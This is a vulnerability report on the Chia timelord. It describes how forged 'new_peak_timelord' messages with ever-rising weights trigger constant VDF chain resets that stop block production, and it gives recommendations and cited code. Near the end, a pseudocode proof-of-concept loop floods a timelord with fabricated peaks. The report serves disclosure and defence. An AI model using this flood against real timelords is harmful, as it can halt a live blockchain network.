### Title
Unauthenticated `new_peak_timelord` Flood Causes Permanent VDF Reset Loop, Halting Block Production — (`chia/timelord/timelord_api.py`, `chia/timelord/timelord.py`)

---

### Summary

A peer presenting as `FULL_NODE` can send a stream of `new_peak_timelord` messages with monotonically increasing, fabricated weight values. Because the timelord performs no cryptographic or blockchain validation of the claimed weight, each message is accepted, sets `self.timelord.new_peak`, and causes the `_manage_chains` loop to call `_reset_chains()` every ~100 ms. VDF computations are interrupted before completion on every cycle. The timelord never produces a valid VDF proof, halting block production for the duration of the attack.

---

### Finding Description

**Entry point — `TimelordAPI.new_peak_timelord`** (`timelord_api.py:60`):

The handler acquires `self.timelord.lock` and performs only a weight comparison:

```python
if self.timelord.last_state.get_weight() < new_peak.reward_chain_block.weight:
    ...
    self.timelord.new_peak = new_peak
``` [1](#0-0) 

There is no proof-of-work verification, no VDF proof check, no signature validation, and no rate limiting. The `weight` field in `NewPeakTimelord.reward_chain_block` is a plain `uint128` that the sender controls entirely. [2](#0-1) 

**Reset trigger — `_manage_chains`** (`timelord.py:926`):

The main loop sleeps 100 ms, then under the lock checks `self.new_peak` and calls `_handle_new_peak()` → `_reset_chains()`: [3](#0-2) 

**`_reset_chains` destroys all in-progress VDF work** (`timelord.py:325`):

Every call stops all active VDF client streams, clears `self.proofs_finished`, increments `self.num_resets`, and resets all iteration tracking. Any proof that arrived between resets is silently discarded because its `label != self.num_resets`. [4](#0-3) 

**`max_allowed_inactivity_time` backoff is neutralized** (`timelord_api.py:66`):

Every `new_peak_timelord` message unconditionally resets the inactivity threshold back to 60 s, preventing the exponential backoff at line 919 from ever firing: [5](#0-4) [6](#0-5) 

**Attack sequence:**

1. Attacker connects to the timelord as a `FULL_NODE` peer.
2. Sends `new_peak_timelord` with `reward_chain_block.weight = current_weight + 1`.
3. `_manage_chains` loop (100 ms tick) picks up `new_peak`, calls `_reset_chains()` — all VDF clients stopped, proofs discarded.
4. Attacker sends `weight = current_weight + 2` before the next VDF proof can complete.
5. Repeat indefinitely.

Because a sub-slot VDF computation takes on the order of seconds (sub_slot_iters / VDF speed), and the reset fires every 100 ms, no proof ever completes.

---

### Impact Explanation

The timelord produces zero VDF proofs (signage points, infusion points, end-of-sub-slot bundles) for the duration of the attack. Without these, farmers cannot create finished blocks and the chain halts. This is a **long-lived inability for timelords to process valid blocks** — a confirmed High-severity impact under the stated scope.

---

### Likelihood Explanation

- The `new_peak_timelord` handler has no per-peer rate limit, no weight-proof validation, and no minimum inter-reset interval.
- The fabricated `weight` field requires no cryptographic material — it is a plain integer.
- Any peer that can establish a `FULL_NODE` connection to the timelord can execute this attack. Publicly reachable timelords are directly exploitable; private timelords require only a compromised or malicious full-node peer in the timelord's peer list.
- The attack is trivially scriptable (send one UDP/TCP message per 100 ms).

---

### Recommendation

1. **Validate weight against a trusted source**: Before accepting a new peak, cross-check the claimed weight against the timelord's own full-node connection or a locally maintained chain tip. Reject peaks whose weight exceeds the locally known tip by more than one block's worth of difficulty.
2. **Rate-limit resets**: Enforce a minimum interval (e.g., one sub-slot time ≈ 10 s) between consecutive `_reset_chains()` calls triggered by external peaks.
3. **Authenticate the sender**: Only accept `new_peak_timelord` from peers whose connection was initiated by the timelord itself (outbound connections to configured trusted full nodes), rejecting inbound `FULL_NODE` peers for this message type.
4. **Do not reset `max_allowed_inactivity_time` on every message**: The unconditional reset to 60 s on line 66 disables the only existing recovery backoff.

---

### Proof of Concept

```python
# Pseudocode – connect as FULL_NODE, flood new_peak_timelord
import asyncio
from chia.protocols.timelord_protocol import NewPeakTimelord
from chia_rs import RewardChainBlock
from chia_rs.sized_ints import uint128

async def attack(timelord_host, timelord_port):
    conn = await connect_as_full_node(timelord_host, timelord_port)
    weight = uint128(10_000_000)
    while True:
        weight += 1
        fake_peak = NewPeakTimelord(
            reward_chain_block=forge_rcb(weight=weight),  # weight only, no valid PoW
            difficulty=..., deficit=..., sub_slot_iters=...,
            sub_epoch_summary=None, previous_reward_challenges=[],
            last_challenge_sb_or_eos_total_iters=0,
            passes_ses_height_but_not_yet_included=False,
        )
        await conn.send(ProtocolMessageTypes.new_peak_timelord, fake_peak)
        await asyncio.sleep(0.1)   # matches _manage_chains loop tick
```

**Expected result**: `_reset_chains()` fires on every loop tick; `self.proofs_finished` is always empty; no `new_signage_point_vdf`, `new_infusion_point_vdf`, or `new_end_of_sub_slot_vdf` messages are ever broadcast to full nodes; block production halts.

### Citations

**File:** chia/timelord/timelord_api.py (L66-66)
```python
            self.timelord.max_allowed_inactivity_time = 60
```

**File:** chia/timelord/timelord_api.py (L93-110)
```python
            if self.timelord.last_state.get_weight() < new_peak.reward_chain_block.weight:
                # if there is an unfinished block with less iterations, skip so we dont orphan it
                if (
                    new_peak.reward_chain_block.height == self.timelord.last_state.last_height + 1
                    and self.check_orphaned_unfinished_block(new_peak) is True
                ):
                    log.info("there is an unfinished block that this peak would orphan - skip peak")
                    self.timelord.state_changed("skipping_peak", {"height": new_peak.reward_chain_block.height})
                    return

                log.info(
                    "Not skipping peak, don't have. Maybe we are not the fastest timelord "
                    f"height: {new_peak.reward_chain_block.height} weight:"
                    f"{new_peak.reward_chain_block.weight} rh {new_peak.reward_chain_block.get_hash()}"
                )
                self.timelord.new_peak = new_peak
                self.timelord.state_changed("new_peak", {"height": new_peak.reward_chain_block.height})
                return
```

**File:** chia/protocols/timelord_protocol.py (L20-28)
```python
class NewPeakTimelord(Streamable):
    reward_chain_block: RewardChainBlock
    difficulty: uint64
    deficit: uint8
    sub_slot_iters: uint64  # SSi in the slot where NewPeak has been infused
    sub_epoch_summary: SubEpochSummary | None  # If NewPeak is the last slot in epoch, the next slot should include this
    previous_reward_challenges: list[tuple[bytes32, uint128]]
    last_challenge_sb_or_eos_total_iters: uint128
    passes_ses_height_but_not_yet_included: bool
```

**File:** chia/timelord/timelord.py (L325-354)
```python
    async def _reset_chains(self, *, first_run: bool = False, only_eos: bool = False) -> None:
        # First, stop all chains.
        self.last_active_time = time.time()
        log.debug("Resetting chains")
        ip_iters = self.last_state.get_last_ip()
        sub_slot_iters = self.last_state.get_sub_slot_iters()

        if not first_run:
            for chain in list(self.chain_type_to_stream.keys()):
                await self._stop_chain(chain)

        # Adjust all signage points iterations to the peak.
        iters_per_signage = uint64(sub_slot_iters // self.constants.NUM_SPS_SUB_SLOT)
        self.signage_point_iters = [
            (uint64(k * iters_per_signage - ip_iters), uint8(k))
            for k in range(1, self.constants.NUM_SPS_SUB_SLOT)
            if k * iters_per_signage - ip_iters > 0
        ]
        for sp, k in self.signage_point_iters:
            assert k * iters_per_signage > 0
            assert k * iters_per_signage < sub_slot_iters
        # Adjust all unfinished blocks iterations to the peak.
        new_unfinished_blocks = []
        self.iters_finished = set()
        self.proofs_finished = []
        self.num_resets += 1
        for chain in [Chain.CHALLENGE_CHAIN, Chain.REWARD_CHAIN, Chain.INFUSED_CHALLENGE_CHAIN]:
            self.iters_to_submit[chain] = []
            self.iters_submitted[chain] = []
        self.iteration_to_proof_type = {}
```

**File:** chia/timelord/timelord.py (L917-920)
```python
        if time.time() - self.last_active_time > active_time_threshold:
            log.error(f"Not active for {active_time_threshold} seconds, restarting all chains")
            self.max_allowed_inactivity_time = min(self.max_allowed_inactivity_time * 2, 1800)
            await self._reset_chains()
```

**File:** chia/timelord/timelord.py (L926-934)
```python
        while not self._shut_down:
            try:
                await asyncio.sleep(0.1)
                async with self.lock:
                    await self._handle_failures()
                    # We've got a new peak, process it.
                    if self.new_peak is not None:
                        await self._handle_new_peak()
                # Map free vdf_clients to unspawned chains.
```
